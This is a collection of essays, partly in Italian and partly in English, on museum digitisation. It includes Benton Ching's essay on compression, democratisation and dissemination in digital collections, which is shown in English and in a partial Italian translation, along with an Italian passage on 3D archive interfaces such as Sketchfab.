Come Land nota, ogni discesa dal paradiso ora è una caduta. Gli eventi si sono susseguiti come in una favola profetica, preannunciando quello che sarebbero diventate delle circostanze ordinarie per gli utenti del digitale. Se è la gravità a trattenerci, a limitare la nostra percezione, allora il “decollo” dal pianeta Terra è, metaforicamente, un’epifania in rapporto alle numerose tecnologie anti-gravità che sono arrivate dopo e che hanno rimesso in scena lo stesso “slancio verso l’esterno” provando ad evadere dalla visione incarnata.4

Un simile stato di fluttuazione da quel momento è stato assorbito come elemento caratterizzante di design e funzionalità delle interfacce nei software. Le interfacce, per i loro utenti, sono immagini strumentali che decodificano le funzioni delle piattaforme digitali; sono “mondi di sogno, seppur ristretti.”5 Ci permettono di visualizzare oggetti isolati, in campi vuoti e astratti che modellano visioni eccezionalmente lucide. L’aumento della chiarezza viene raggiunto togliendo ogni distrazione esterna o presenza di sfondo – il rumore proprio della realtà fisica. Questa dinamica mi è familiare, ed è qualcosa che ho personalmente interiorizzato. Essendo cresciuta negli anni ’90, quando la diffusione delle visioni mediate da interfacce di PC stava arrivando al suo apice, fui portata a percepire quella possibilità in particolare di “vedere” – ovvero, oltre la bidimensionalità dello schermo – come nuova. I primi videogame sviluppati con grafiche 3D e i programmi .exe interattivi erano ancora un’esperienza molto emozionante per la me bambina dei primi anni 2000. Gli avanzamenti tecnologici nell’imaging digitale hanno fatto sì che i render tridimensionali di oggetti fluttuanti diventassero un incontro comune: sia le anteprime di prodotti acquistabili e le mappe free-roaming interattive sviluppate su piattaforme come Google Earth e Google Street View coinvolgono gli utenti tramite ottiche 3D, così come fanno i tour virtuali degli spazi espositivi ‘forniti’ da Google Arts & Culture. Recentemente anche i musei hanno iniziato ad utilizzare sistemi digitali per trasformare i loro archivi in risorse accessibili online, e la pratica si è diffusa velocemente.
A luglio 2017 il primo modello Sketchfab della Stele di Rosetta è apparso su Internet. Oggi il British Museum è una delle tante istituzioni culturali che investono su acquisizioni e caricamenti online in 3D di una parte sostanziale delle loro collezioni. Esempi di altre pietre digitalizzate sono i caricamenti degli ostrakon (pezzi di ceramica rotta risalenti all’antica Grecia e all’antico Egitto su cui erano trascritte lettere, ricevute, votazioni elettorali e ostracismi) da parte dell’Harvard Semitic Museum; e diverse stele Maya, riportanti informazioni su calendari lunari, astronomia, entità sovrannaturali e contesti temporali in alternanza, caricate sulla pagina online del Museum of Archaeology and Anthropology di Cambridge. Una moltitudine di artefatti storici esiste sotto forma di dati generati da una scansione, sospesa all’interno delle interfacce di di Sketchfab e Scan the World. Sculture antiche, reperti preistorici e monoliti coesistono nella stessa piattaforma con scan e design 3D generati dalla community. Si possono trovare riproduzioni fedeli di cabine di pilotaggio di aeromobili e scansioni iper-dettagliate del portale principale di Notre-Dame de Paris. Appaiono sotto lo stesso indice, e si cercano, scaricano e stampano nello stesso modo. Le istituzioni culturali usano queste tecnologie per aumentare la portata dei loro archivi digitali, aggiungendo progressivamente nuove scansioni e affermando la loro presenza come organizzazioni eminenti, aggiornate, a cui interessa essere globalmente accessibili. Ora che l’accesso a centinaia di archivi e collezioni disseminati per il mondo è garantito, gli utenti presumibilmente traggono beneficio da questa democratizzazione, oltre che da un’aumentata accessibilità per quanto riguarda il patrimonio culturale internazionale. L’eliminazione delle gerarchie potrebbe sembrare un gesto genuinamente positivo, un atto di generosità verso quello a cui spesso si fa riferimento come ‘pubbico generale.’

I musei hanno programmato banche di immagini fisiche sin dall’illuminismo, quando le enciclopedie venivano accompagnate da supplementi di natura visiva.6 Oggi gli archivi museali si fondono con la dimensione digitale, e diventano dati. L’implementazione del database come logica operativa fa sì che le collezioni si trasformino in risorse online digitalizzate, pronte ad accogliere nuovi desideri e aspettative aptiche. Queste ultime sono diventate astratte da quando la velocità degli avanzamenti tecnologici ha iniziato a promettere un’esperienza estetica distinta, che riproduce quelle qualità tattili che un tempo erano esclusivamente proprie della realtà fisica, come il volume, il materiale o la texture. Grazie al supporto dell’hardware, gli spazi virtuali permettono al visitatore-utente di interagire con ciascun oggetto caricato. Ma è principalmente un aumento della disponibilità delle immagini ad essere osservabile. Gli artefatti sono resi visibili tramite le interfacce con una breve descrizione allegata; si manifestano in una dimensione altra, non familiare, dove la località di un utente e la specificità geografica dei musei sembrano non influenzare il modo in cui le informazioni vengono consumate. Questo mutamento perpetua la nozione che cose identificabili come “formalmente equivalenti” per via della loro condizione condivisa (in questo caso l’essere computabili, che le porta ad esistere come modelli 3D) siano, di conseguenza, “ontologicamente e culturalmente equivalenti,”7 implicando dunque che la loro natura e il loro valore culturale siano a loro volta comparabili. Ogni oggetto si sposta in una dimensione dove l’interfaccia, il mezzo di navigazione, è l’unico mediatore tra il visibile – quello che può essere conosciuto – e le invisibilità del software.8
Il primo messaggio che appare quando si accede all’archivio digitale è “Loading 3D model…,” seguito da “click & hold to rotate.” Come portali costruiti al confine con un’altra dimensione, le interfacce assorbono sguardi e trasmettono gesti. La loro risposta proviene da un luogo che risiede oltre i processi visibili. Indubbiamente, come nota Benjamin H. Bratton, “le piattaforme non appaiono nel modo in cui funzionano e non funzionano come appaiono”: gli utenti tendono a comprendere le loro interazioni in rapporto alle gerarchie determinate dalle interfacce grafiche, ma queste non corrispondono alla struttura effettiva delle interazioni interne alla piattaforma.9 L’interattività dei media si nutre dello squilibrio che lega la necessità di comunicare costantemente degli utenti, e l’ideale che le informazioni siano sempre disponibili, alle possibilità offerte dalla tecnologia per la progettazione e rivendicazione di spazi governativi poco riconoscibili. È una relazione che caratterizza l’autorità sulle piattaforme in quanto associa l’illeggibilità geografica a un’incredibile accumulo di interazioni: il meccanismo che limita la nostra attività è autocratico, e poiché garantisce una libertà d’uso apparente, finisce per rafforzare il potere standardizzante delle piattaforme.10 “Model Inspector,” “View in VR,” “Theater mode” e “Fullscreen” sono alcuni dei comandi eseguibili su Sketchfab, e sotto il visore interattivo, gli utenti possono vedere il conteggio di “Download,” “View” e “Like,” assieme al numero di triangoli e vertici che compongono il modello e un link alla licenza di copyright del materiale. Poiché il “software connette indizi visuali a forze nascoste,” le immagini che vediamo sono solo lo strato più esterno di un sistema costituito dal basso, di una infrastruttura resa invisibile sfruttando l’essenza intrinsecamente “non conoscibile” dell’esecuzione di dati.11
Il desiderio di esplorare ciò che non può essere visto si traduce nella volontà di comprendere “i diagrammi che cerchiamo di abitare” {the diagrams we seek to inhabit}, come descrive Wendy Hui Kong Chun.12 Interfacce come quelle impiegate dai musei per presentare le loro collezioni digitali offrono alla nostra soggettività, in apparenza autonoma, l’opportunità di “mappare” il network dirigendo la navigazione e permettendo l’archiviazione dei file. Allo stesso tempo, ogni interazione viene mappata.13 Un’altra idea di luogo entra in gioco quando sia la linea dell’orizzonte che i referenti fisici svaniscono, e il nostro concetto di località subisce una trasformazione inevitabile. Le opere d’arte vengono visualizzate nello scenario virtuale definito dall’interfaccia. Lo sguardo è de-territorializzato, il punto di vista sospeso, e l’utente è in “caduta libera” {free fall} nel significato.14 È evidente che l’atto di distanziarsi da tutto per acquisire la capacità di vedere dal ‘nulla’ è una proprietà fondante di vari strumenti tecnologici di visualizzazione, incluse le tecnologie di imaging via radar, i panorami formati da immagini assemblate dagli algoritmi, le esperienze di realtà virtuale generate da computer e rese fruibili tramite VR headset. Le tecnologie di computazione operano in modi che sorpassano e inondano le cartografie classiche.15 In un certo senso, il distacco dalla dimensione corporea potrebbe sembrare più una conquista che un inquietante effetto collaterale del superamento della localizzazione geografica, se consideriamo che l’occhio può finalmente sfuggire ai limiti fisici e osservare da una posizione onnisciente, ’al di sopra,’ come viene definita da un ‘esterno’ corrispondente al virtuale. Fondamentalmente, programmare un ambiente presuppone l’eliminazione di ogni indeterminatezza, il disegno di una realtà calcolabile in cui il peso del reale, potendo essere immaginato, razionalizzato e monitorato, sembra essere più comprensibile.
Azioni come muoversi all’interno del network e cercare informazioni sul database potrebbero suggerire un coinvolgimento più profondo con le medesime ambizioni anti-gravitazionali che, a metà del secolo scorso, spinsero gli umani ad abbandonare le coordinate terrestri. Attualmente una simile mancanza di terreno influenza le capacità percettive di tutti gli utenti. Dal momento in cui condividiamo, capiamo e interpretiamo il mondo principalmente attraverso la mediazione del linguaggio (e della forma testuale), spesso finiamo per vedere “quello che uno dice sulle cose” {what one says about things}.16 Il linguaggio, essendo attivo a livello infrastrutturale, in un modo non dissimile da software, hardware e codici informatici viene sempre postulato come già esistente, come qualcosa di ovvio, una fonte.17 Il ruolo cruciale del linguaggio nel lavoro dei musei e degli archivi va ben oltre il loro status di custodi della conoscenza. La sensazione che gli archivi ci permettano di vedere la struttura completa di un sistema orchestrato globalmente, in cui arte, cultura e storia si dispiegano di fronte a noi in diagrammi luminosi, è un’illusione. Anche se l’imperativo culturale del presente sembra essere more data is better, l’archivio può solamente restare “parziale,” “incompleto,” e ci può solo dare “risposte codificate” comunicate con tecnologie che cambiano “il significato stesso di ciò che viene trasmesso.”18 Questa conflittualità emerge nel contesto degli archivi digitali osservando il modo in cui la mediazione istituzionale online occupa certe strutture percettive, come quelle viste su Sketchfab. È propria di quella leggerezza nella trasposizione che costituisce il nucleo della digitalizzazione delle collezioni museali. Assumendo le sembianze di entusiasmi filantropici, queste procedure sembrano ignorare sia le loro stesse intenzioni ambigue che la natura delle informazioni. I musei finiscono per rafforzare le sistematicità dietro alla regolamentazione del sapere mentre alterano radicalmente il significato degli oggetti che scelgono di convertire. Qualsiasi tentativo di cogliere i balzi non lineari, il tempo frammentato e i limiti intangibili della realtà deve considerare il modo in cui la soppressione delle complessità è innata alla disposizione attuale delle interfacce, programmi e dispositivi che stanno plasmando gli archivi contemporanei.Cosa costituisce un’operazione istituzionale all’interno di questa struttura, e come viene influenzato il processo del conoscere? L’archivio digitale, con la sua natura in perenne mutamento, svincolato da una località fissa, si dimostra una base positivamente stimolante per ripensare al modo in cui le istituzioni narrano il presente, sia linguisticamente che visivamente, e a come il sapere può essere processato diversamente.19 I dati introducono modelli di lettura che si distanziano dall’analisi testuale, e di conseguenza possono ancora essere sfruttati per generare interruzioni produttive, per sospendere la familiarità di un soggetto con il mondo linguistico e visivo. Cadere attraverso la nuvola significa saltare da un continente di dati all’altro, navigare isole di significato, e nuotare in fiumi infiniti di informazioni. Imparare a comprendere i network su cui siamo atterrati vuol dire realizzare che non possono essere interpretati né come testo, né come pura immagine. Alla luce di questo cambiamento, potrebbe rivelarsi utile ricontestualizzare l’argomento ponendo l’attenzione su una interpretazione di “geografia” come “scrittura della terra” {earth-writing} – un modo per scrivere lo spazio e per esprimere, comunicare e rendere politiche le immagini che formano questi nuovi territori.20 Questa volta però l’interazione tra noi e le terre sconosciute dovrà essere diversa dalle brame del passato per l’esplorazione dello spazio profondo. Decodificare queste informazioni disseminate potrebbe richiedere da parte nostra l’abbandono dell’ermeneutica a favore dell’applicazione di un modello visivo che comprenda altre modalità conoscitive, come “scansionare,” “ridisporre,” “filtrare,” {scanning, rearranging, filtering}21 e infine riconnettersi attraverso quell’abisso in cui abbiamo paura di guardare, nelle profondità e aperture lasciate dai dati. Forse dovremmo solo abbracciare la nuvola.

The Digital Collection:
Compression, Democracy and Dissemination
by Benton Ching
It’s a quarter to six on a Tuesday afternoon, and Geoff (not his real name) is getting ready for the end of his shift. We’re talking about his experience working at the V&A, having worked there in visitor experience for over 10 years, and his take on the societal value of museums. “So i bought my grandkid a book for Christmas – she took one look at it and swiped her finger across the bloody thing!” he chuckles, drawing lines across his palm with his finger to mimic the skeumorphic gesture of using a touchscreen. Before we part ways, he extols the importance of the museum’s role in preserving important cultural knowledge (such as the use of books/scrolls/parchment), while lamenting some of the challenges the museum has faced in integrating new technology into its practices.
What will the museum of the future look like? For Geoff’s grandchild, digitisation will certainly play a major role in shaping her future experience of the museum. As a designer with a background in philosophy and political theory, and a keen interest in the societal impact of technology, my research into museums centers around questions of how digital processes might improve access to collections, and facilitate the process of meaning-making in museums. In Art and the Brain, Neuroscientist Semir Zeki argues that the function of art is an extension of the function of the brain. That is, to seek knowledge in an ever-changing world.1 Can the digital collection play a significant role beyond that of a digital ledger or record, and facilitate this process of meaning-making? The notion of meaning-making through collections is not a novel one. Collectors in the Enlightenment era engaged in what Philip Blom refers to as “practical alchemy”2, attempts to divine a hidden truth through collecting the wonders of the world around them. The objects in their collections were thought to transcend thing-hood, and were viewed as important puzzle pieces in the quest for universal meaning. Though the modern collection might not share the same intention of discovering the secrets of the universe, it continues to play an important role in the preservation and dissemination of cultural knowledge. In both instances, the eccentric private collector and the modern museum would have to judge what belongs within the realm of the collection. In the former case, the question might be what artefacts would best represent some important truth about the universe. While in the latter, the judgment may concern what items are of most cultural or historical importance.
You could think of this as an everyday form of data compression. When compressing music into a .mp3, the bits of sound outside the range of human hearing are generally removed to optimise the size of the audio file. By analogy, as collections decide what to collect or display, bits deemed inaudible or irrelevant are inevitably left out. This essay uses the informational technics of compression in digital formatting as a framework to address some of the broad challenges to access and meaning-making facing those in the practice of display and collection in the digital age.3
THE MUSEUM AS SITE OF COMPRESSION
As part of my research, I spoke to Christopher Marsden, Senior Archivist in the Word and Image Department at the Victoria & Albert Museum’s archives at Blythe House, to gain an understanding of how museum archives work and the challenges posed by digitisation. According to Christopher, one of the biggest challenges for both museums and archivists is how to handle “born-digital” material – assets which exist purely in digital form. This material becomes increasingly ubiquitous as digital processes become more embedded in our everyday lives. For the V&A’s archives specifically, this extends from the 2D and 3D CAD (Computer Aided Design) files used by architects and designers, to field recordings used by sound artists, or digital videos that capture moving image. Such files might seem like the archivist’s best friend. After all, you can easily save a document on your computer with the click of a button and transfer it onto another using a USB drive, an email or a cloud storage service. However as you shall see below, significant challenges stem from the extension of archival practice to the virtual sphere.
My interest in museum digitisation was spurred by a naive but (I think) still relevant question: what do museums do with all the stuff they don’t display? If we accept that museums are limited in what they can afford to display at any given time, what is an ideal second-best option? Such discussions often quickly turn to digitisation4 as a solution to reveal what lies beneath the tip of the museum iceberg.
Digitisation plays an important role today for museums and archives, and is considered good practice for collections management according to Spectrum 5.0, the UK Collections Trust’s collections management standard.5 There’s a review section in Museums Journal, the print magazine of the Museums Association, dedicated to reviewing the websites and online catalogues of galleries and museums.6 Consider also Olafur Eliasson’s digital archival project Your Uncertain Archive, which graced the covers of the design journal Disegno in 2014.7 Even libraries are getting in on the act, with the Bodleian library’s dedicated Twitter account that keeps bibliophiles up to date with its digitisation and preservation practices.8 Beyond the practical dimension of digitisation, there seems to be strong evidence that the digital collection is becoming an experience in its own right.

Boris Groys, drawing on Durkheim’s sacred-profane dichotomy, discusses the role of the collection in perpetuating what is considered culturally valuable by making a distinction between The Cultural Archive and the Profane Realm.9 The latter refers to the ever-growing set of everyday objects and ideas which are considered dispensable, whilst the former refers to the items and thoughts that society takes from the realm of the profane, and elevates to the pedestal or plinth. Through the curation of what is deemed culturally significant, collections engage in a form of historical compression: presenting the visitor with only the parts of cultural knowledge taken to be essential or worthy of transmission. In the exercise of power through display; hiding and revealing, museums bring about the apotheosis of holy relics and patron saints of our day. Digitisation might be seen as a way of ameliorating this compressed account of cultural history, allowing the museum to display in virtual space what it would normally be unable to show in the physical space of the museum. The museum’s digital counterpart serves to make artefacts normally hidden in storage or archives visible, thus revealing previously unknown or inaccessible parts of the collection to new audiences online.
One of the ethical challenges that emerges alongside the digital museum’s capacity to reveal is how one treats alternative conceptions of value concerning display. In the Bambui kingdom in North Western Cameroon for example, notions of sacred and profane are inverted from the model proposed by Groys. Mathias Alubafi Fubah writes that in Bambui culture, local notions of sacredness and secrecy mandate that the most important artefacts such as ancestral drinking cups, statues, masks and gowns are kept hidden away in storage. These items gain their value from “concealment rather than revelation”.10 This method of determining value stands diametrically opposed to the way most Western museums treat valuable cultural artefacts. Herein lies a significant tension: digitisation attempts to provide greater accessibility and democratisation of the museum’s archives and reserve collections. Yet, to reveal some cultural artifacts results in a diminishing of their status according to local tradition. A first significant challenge emerges for those in the business of digitisation: does the practice perpetuate a kind of cultural homogenisation rooted in principles of Enlightenment reason?
Certainly, digitisation allows for greater democratisation and ease of access to a collection were it not digitised. However, an additional challenge concerning the democratisation of the museum collection that emerges from digitisation is how one finds or stumbles upon artefacts of relevance.11 How does one make the swathes of information practically available for perusal? In a sea of millions of digital objects, the blank search bar becomes an intimidating prospect. Museums might attempt to reintroduce the serendipity of discovery by employing the use of a recommendation algorithm to suggest relevant works. However, this path is itself fraught with dubious outcomes for agency.12 A project that (in my opinion) successfully introduces serendipity to the digital museum experience using algorithms is Recognition by Fabrica and JoliBrain, winner of the Tate’s 2016 IK prize, which created an online gallery using a machine learning algorithm to compare new images from Reuters to similarly composed images within the Tate’s art and archival collections.13

Furthermore, there is a significant cost to both digitising an existing collection, as well as attendant challenges of maintaining the software architecture and ensuring this digital collection survives the process of technological obsolescence. This means that museums with more funding to allocate to the digitisation process can afford to reap the benefits of visibility afforded by digitisation. In this way, better funded institutions exercise a greater influence on what sits within the canon, providing yet another challenge for the democratisation of the digitisation process.14
In spite of the perceived effervescence of the virtual, an associated challenge that stands in the way of considering the digital collection a final preservation solution or process of immortalization of the object is the vulnerable physical material associated with the data. Possible issues that will arise on a mid to long-term horizon include the vulnerability of the sites where data is physically stored, the corruptibility of digital information and as mentioned earlier, the likely possibility of technological obsolescence. The digital data museums accumulate is not as immaterial as one might assume. In one of his most comprehensive interviews, the notoriously elusive musician Aphex Twin mentions how an analog format like the vinyl record, despite being older, might outlast newer digital formats found on USBs, hard drives and even online cloud streaming services, making it his preferred method of archiving his work. Ironically, the interview was initially found on Soundcloud but subsequently deleted, and can now only be accessed via the Wayback Machine, an archive of the internet.15
So far I have considered the institutional challenges that digitisation brings to the politics of display and canonisation, and whether it necessarily constitutes a process of democratisation. I will now turn to a look at the objects themselves, and how digitisation affects changes in representation and dissemination.
ATTENDING TO THE OBJECTS THEMSELVES
When one enters and leaves Blythe House, they are greeted from behind a large gate by Igor Mitoraj’s Luci di Nara – a large sculpture of a fragmented face. I can’t help but feel like the sculpture represents the spirit of the practice of collecting ephemera that archivists such as Christopher engage in. The fragments of leftover material; the contents of Lucienne Day’s studio drawer, a dusty unopened model train set from another time, a personal collection of covers of Penguin novels. The archivist puts these together, trying to impose as little meaning as necessary to allow visitors to piece together their own narratives and profiles of the people whose effects are preserved within.
A second area of contention that emerges from digitisation is the representation of objects within virtual space. Armed with the prospect of an aesthetics of the simulated object alongside optimistic belief in the possibility of greater verisimilitude in the digitisation process, one might consider digitisation as an immortalisation of the museum object. Indeed, the process of digitisation allows us to freeze an object, or even an entire site in time, allowing the possibility of revisiting it in its captured state in future. One project attempting to do this is NewPalmyra, an attempt to restore the Palmyra Arch, destroyed by ISIS in Syria in October 2015. This project resulted in a scaled-down 3D printed replica of the arch that was toured around the world.16 It currently lives in Dubai, standing as a testament to our technical ability to both revive and immortalise that which was lost. In a similar vein, Google’s Arts and Culture wing runs the OpenHeritage project, which allows online users to explore virtual recreations of historical sites. The challenge is how to decide when and what in a valued object or site ought to be captured.
When an object (say an old musical instrument) is digitised, whether through the capturing of an image, 3D-scan or through a recording of the sound it makes, institutions need to decide on the best form of representation. After all, it is virtually impossible to capture the noumenal object replete with its full function and embodiment. This pragmatic choice results in the compression of meaning in an object: certain elements of its physical information are removed in its transmission to the virtual. This is a matter of concern for those involved in the study of archival material, especially as digital museums replace physical study rooms in museums.17 Digital surrogates become seen as the cheaper, safer alternative to handling the physical object, which makes keepers of collections more reluctant to allow access to the originals.18 With diminished access to the objects themselves, representation and meaning become locked into the elements deemed relevant in the creation of the digital copy.
We might expect this to be a technical problem that our increasing technological prowess will one day resolve: the complete simulation of an object’s form, function and meaning. This is a phenomenon Jonathan Sterne refers to as the dream of verisimilitude: the pursuit of an ever-more realistic portrayal of or correspondence with “reality” through our media, which has often been indicative of technological progress. A complication that arises however, is that aesthetic pleasure, immersion and definition have no necessary relationship to one another.19 Often, for representation to mirror reality, it has to be augmented – touched up. In the words of Robert J. Flaherty, who directed Moana, a controversial docufiction about Polynesian life:
“Sometimes you have to lie… One often has to distort a thing to catch its true spirit.”20
This, and other practices of reality-augmentation are examples of Baudrillard’s hyperreality: a distorted simulation of the real, which appears realer than reality itself.21 The creation of the hyperreal is pervasive in media practice. In the domain of sound, current recording practice dictates that sounds should have more treble than would be actually heard in the real situation.22 In documentary filmmaking, it is common practice to use re-enactment in place of actual found footage.23 In Schwartz’s terms, the modern culture of the copy tends towards each replay and simulation transcending the original. In the satirical short story Pierre Menard, Author of the Quixote, Borges writes of Pierre Menard, a fictional author who, so immersed in Cervantes’ Don Quixote, writes a word-for-word copy in the original 17th Century Spanish. The story details a review of Menard’s reproduction of the Quixote, which argues that the copy was in fact superior to Cervantes’ original because of the levels of immersion Menard would have needed to be able to recreate the Quixote with exact accuracy from his 20th Century context.
The creation of the hyperreal image indistinguishable from reality is a topic that characterizes the recent work of photographer Andreas Gursky. His piece, the digitally altered Rhine II sold for a fee of USD $4.3 million in 2011, the largest sum paid for a photograph.24 What is interesting about the piece is that it is a digital print. There is no restriction on how many instantiations this piece could have, should Gursky decide to print more. This is unlike a photograph on film, whose physicality limits its reproduction. Reflecting on his own work, Gursky describes his project as such:
“I am interested in the ideal typical approximation of everyday phenomena – in creating the essence of reality.”25
Rhine II, Andreas Gursky → View source
The dream of verisimilitude, and the hyperreal images exemplified by Gursky’s Rhine II stand in contrast to what Hito Steryl refers to as the “poor image”. This refers to the sea of low-resolution images that have been compressed, re-edited, downloaded and uploaded. In her paper In Defense of the Poor Image, she argues for a repositioning of these images within the hierarchy of value. Rather than representing the accuracy of the subject itself, such images present a snapshot of the people involved in its reappropriation. Like the patina of well-worn leather often held as a badge of honour, the marks of these images reveal a multiplicity of use to be respected, or at least investigated.26 For Steryl, a new metric of appreciation should emerge for the appraisal of poor images, one in which value is determined not by resolution or scarcity, but rather by speed, intensity and spread of dissemination. The poor image points not to the original source from which it stems, but rather to the lived conditions which lead to its digital dispersion. It is for this reason that Steryl argues that these images tell us about more about reality than the high definition images which society traditionally tends to value.27
Steryl’s points can be extended also to the materiality of other digital media such as sound. Despite the perceived equivalence of newer digital audio files to analog formats, the sound differs in the way it decomposes. A DJ slowing down a vinyl record produces a distinct set of low end frequencies, as do .wav files, and .mp3s.28 When a .mp3 is compressed more than once, a musical equivalent to pixelation in images known as a “compression artefact” is created.29 Steryl’s calls for a new aesthetics for the compressed visual is something that already exists in the realm of music, particularly in the appreciation of the burgeoning sample culture stemming from the use of the AKAI MPC drum machine and sampling in the 90s30, and emerging genres of music such as lo-fi house31 and Gqom – a genre of South African house music from Durban made popular through the rattling speakers of the multitude of minibus taxis travelling between townships across the country.32
Can we consider the 3D models of digital collections in the same light? Christophe Lemaitre suggests that any attempt to restore a work of art should never regress in time, or try to fix the meaning of the piece. Instead, to be involved in restoration is to be in the business of re-production: a continuation and extension of a piece.33 This is epitomised for instance in the restoration of frescoes using the tratteggio technique. According to this practice, modifications are made clearly visible when one stands close to the piece, but indistinguishable from afar.34 Might we say the same for our practices of digital preservation?
An aesthetics of the simulated and hyperreal would involve a rejection of the idea that the simulated and compressed are a mere shadow or apparition of the truth. Rather, digital surrogates become re-productions in Lemaitre’s sense. In this case, the object and its digital counterparts function like the Ship of Theseus, whose parts never remain constant and are constantly replaced and augmented. They remain united in virtue of being part of the same chain of causal continuity. Considered this way, digital copies continue to add meaning to the original, whilst simultaneously taking on novel meanings in their own right, with specific attention devoted to their materiality as digital objects.
How might we come to terms with the mechanisms of compression that occur within collections in the digital age? As societal conceptions of value shift from the valorization of the immutable original to an appreciation of the widely disseminated copy, the knowledge that what collections currently represent is but one way of compressing or formatting what we ought to consider culturally salient. This opens up necessary room for the creation of new adumbrations, interpretations and counter-narratives that offer stark alternatives to our current practices of dissemination and preservation. In so doing, we can challenge the dominant voices that drive our cultural institutions, and the voices conventionally deemed outside the metaphorical range of hearing might be made audible.

La collezione digitale:
compressione, democrazia e diffusione
di Benton Ching
Sono le sei meno un quarto di martedì pomeriggio, e Geoff (non è il suo vero nome) si sta preparando per la fine del suo turno. Stiamo parlando della sua esperienza al Victoria & Albert Museum, del suo lavoro decennale nel dipartimento dell’esperienza museale e della sua prospettiva sul valore sociale dei musei. “Ho comperato un libro per mia nipote per natale – lo ha guardato in un attimo e ha strisciato il dito su quel cavolo di oggetto!” ride, mentre imita il gesto usando il suo dito sopra la sua altra mano per imitare un touchscreen. Prima di salutarci, glorifica l’importanza del ruolo del museo nel preservare importanti conoscenze culturali (come l’uso dei libri e pergamene), mentre si lamenta di certe sfide che il museo ha dovuto affrontare nell’integrazione di nuove tecnologie alle sue pratiche.
A cosa assomiglierà il museo del futuro? Per la nipote di Geoff, la digitalizzazione avrà di sicuro un ruolo importante nella sua futura esperienza del museo. In quanto designer con una formazione in filosofia e teoria politica, con un forte interesse nell’impatto nella tecnologia nella società, la mia ricerca sui musei gira attorno a domande su come i processi digitali possono migliorare accessi alle collezioni, e facilitare il processo della creazione di significato nel musei. In Art and the Brain, il neuroscienziato Semir Zeki sostiene che la funzione dell’arte è un’estensione della funzione del cervello, cerncando conoscenze in un mondo in cambiamento continuo.1 La collezione digitale può avere un ruolo significante oltre a quello di registro, e facilitare questo processo di creazione di significato? La nozione di creare significato attraverso collezioni non è nuova. Collezionisti nell’era dell’illuminismo si impegnarono con quello che Philip Blom chiama “l’alchimia pratica” {practical alchemy},2 tentativi di nascondere una verità divina nel collezionare meraviglie del mondo che li circondava. Gli oggetti delle loro collezioni erano pensati come trascendenti lo status di cosa, ed erano visti come importanti pezzi di un puzzle nella ricerca di un significato universale. La collezione moderna non condivide la stessa intenzione si scoprire segreti dell’universo, ma continua ad avere un ruolo importante nella preservazione e disseminazione della conoscenza culturale. Nei due casi, il collezionista privato eccentrico e il museo moderno devono giudicare cosa appartiene al regno della collezione. Nel primo caso, la domando potrebbe essere quali artefatti rappresentano al meglio un’importante verità dell’universo. Mentre nel secondo, il giudizio potrebbe riguardare quali oggetti sono di maggiore importanza storica o culturale.
Si potrebbe pensare a questo come una forma quotidiana di compressione dei dati. Quando la compressione di musica si fa in un formato .mp3, i bits del suono al di fuori del campo udibile vengono rimossi per ottimizzare la dimensione del file audio. Per analogia, quando le collezioni decidono cosa collezionare o mostrare, i pezzi ritenuti inaudibili o irrilevanti sono inevitabilmente esclusi. Questo saggio usa la tecnologia dell’informazione di compressione digitale come una struttura per affrontare le ampie sfide nell’accesso e nella creazione di significato nelle pratiche di display e di collezioni nell’era digitale.3
IL MUSEO COME SITO DI COMPRESSIONE
Nel corso della mia ricerca , ho parlato con Christopher Marsden, il maggiore archivista del Dipartimento “Word and Image” negli archivi del Victoria & Albert Museum, a Blythe House, per capire come funzionano gli archivi museali e quali siano le difficoltà poste dalla digitalizzazione. Secondo Christopher, una delle maggiori sfide sia per i musei che per gli archivisti è come gestire il materiale “nato-digitale” {born-digital}, un patrimonio che esiste solo in forma digitale. Questo materiale diventa sempre più diffuso man mano che i processi digitali si integrano sempre più nella vita quotidiana. Per gli archivi del V&A in particolare, questo aspetto include dai file CAD (Computer Aided Design) 2D e 3D utilizzati da architetti e designer, alle registrazioni sul campo utilizzate da artisti, fino ai video digitali che catturano immagini in movimento. Tali files potrebbero sembrare i migliori amici dell’archivista. In fin dei conti, è facile salvare un documento con un clic sul proprio computer e trasferirlo su un altro utilizzando una chiavetta USB, un’e-mail o un servizio di cloud storage. Tuttavia, come vedrete in questo testo, le sfide significative derivano dall’estensione della pratica archivistica alla sfera virtuale.
Il mio interesse per la digitalizzazione dei musei è stato stimolato da una domanda ingenua ma (credo) ancora attuale: cosa ci fanno i musei con tutto ciò che non espongono in mostra? Se accettiamo il fatto che i musei siano limitati in ciò che possono permettersi di esporre in qualsiasi momento, idealmente quale sarebbe la miglior alternativa a tutto questo? Queste discussioni spesso considerano in maniera affrettata la digitalizzazione4 come soluzione per rivelare ciò che si trova sotto la punta dell’iceberg.La digitalizzazione gioca oggi un ruolo importante per i musei e gli archivi, ed è considerata una buona pratica per la gestione delle collezioni secondo lo Spectrum 5.0, lo standard di gestione delle collezioni dell’UK Collections Trust.5 Nel Museums Journal (la rivista cartacea della Museums Association) c’è anche una sezione dedicata alla revisione dei siti web e dei cataloghi online di gallerie e musei.6 Basta pensare al progetto di archivio digitale Your Uncertain Archive di Olafur Eliasson, che ha abbellito le copertine della rivista di design Disegno nel 2014.7 Anche le biblioteche si stanno mobilitando, con l’account Twitter della biblioteca Bodleian che tiene i bibliofili aggiornati sulle sue pratiche di digitalizzazione e conservazione.8 Al di là della dimensione pratica della digitalizzazione, sembra esserci una forte tendenza a favore del fatto che la collezione digitale stia diventando un’esperienza a sé stante.

Boris Groys, attingendo alla dicotomia sacro-profana di Durkheim, discute il ruolo della collezione nel perpetuare ciò che è considerato culturalmente prezioso facendo una distinzione tra l’Archivio Culturale e il Regno Profano.9 Il secondo si riferisce all’insieme sempre crescente di oggetti e idee quotidiane che sono considerati superflui, mentre il primo si riferisce agli oggetti e ai pensieri che la società prende dal regno del profano, ed eleva su un piedistallo. Attraverso la selezione di ciò che viene considerato culturalmente significativo, le collezioni attuano una forma di compressione storica: vengono presentate al visitatore solo le parti di conoscenza culturale ritenute essenziali o degne di trasmissione. Nell’esercizio del potere attraverso l’esposizione; nascondendo e rivelando, i musei provocano l’apoteosi delle sante reliquie e dei santi patroni dei nostri giorni. La digitalizzazione potrebbe essere vista come un modo per migliorare questo racconto compresso della storia culturale, permettendo al museo di mostrare in uno spazio virtuale ciò che normalmente non sarebbe in grado di mostrare nello spazio fisico. La controparte digitale del museo serve a rendere visibili gli artefatti normalmente nascosti nei depositi o negli archivi, rivelando così al nuovo pubblico on-line, parti della collezione precedentemente sconosciute o inaccessibili.
